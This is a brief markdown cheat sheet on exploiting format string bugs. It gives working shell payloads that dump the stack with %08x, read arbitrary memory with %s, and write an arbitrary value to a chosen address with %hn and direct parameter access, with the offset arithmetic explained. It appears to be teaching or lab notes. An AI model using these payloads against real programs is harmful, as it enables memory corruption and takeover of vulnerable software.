# Format Strings

---

- [Examining The Stack](#examining-the-stack)
- [Reading From An Arbitary Memory Address](#reading-from-an-arbitary-memory-address)
- [Writing To An Arbitary Memory Address](#writing-to-an-arbitary-memory-address)

<a name="examining-the-stack"></a>
## Examining The Stack
Using %08x will print 8 bytes of the top of the stack. Repeating this can display as much of the stack as needed. These will be displayed reversed if it's little-endian architecture.
```sh
./example $(python -c 'print("%08x " * 40)')
```

<a name="reading-from-an-arbitary-memory-address"></a>
## Reading From An Arbitary Memory Address
The following shows the input is on the stack itself.
```sh
./example "AAAA%08x %08x %08x %08x"

```

Therefore we can read from the given address (0xbffffe90) by using %s which deferences the address.
```sh
./example "$(printf "\x90\xfe\xff\xbf")%08x %08x %08x %s"
```

<a name="writing-to-an-arbitary-memory-address"></a>
## Writing To An Arbitary Memory Address
%hn will write the number of bytes wrote so far to an address as 2 bytes (int16). The following will write 0xbffffd72 to 0x08049794.
```sh
./example $(printf "\x94\x97\x04\x08")$(printf "\x96\x97\x04\x08")%64874x%4\$hn%49805x%5\$hn
```
- $(printf "\x94\x97\x04\x08")
    - Address we are writing to.
- $(printf "\x96\x97\x04\x08")
    - Address we are writing to + 2 bytes.
- %64874x%4\$hn
    - Write 0xfd72 to 0x08049794.
    - 0xfd72 - 8 = 64874.
    - %4 = Position 4. (Direct Parameter Access)
- %49805x%5\$hn
    - Write 0xbfff to 0x08049796.
    - 0xbfff - 0xfd72 = -15731. Negative, so we wrap the value around.
    - 0x1bfff - 0xfd72 = 49805
    - %5 = Position 5. (Direct Parameter Access)
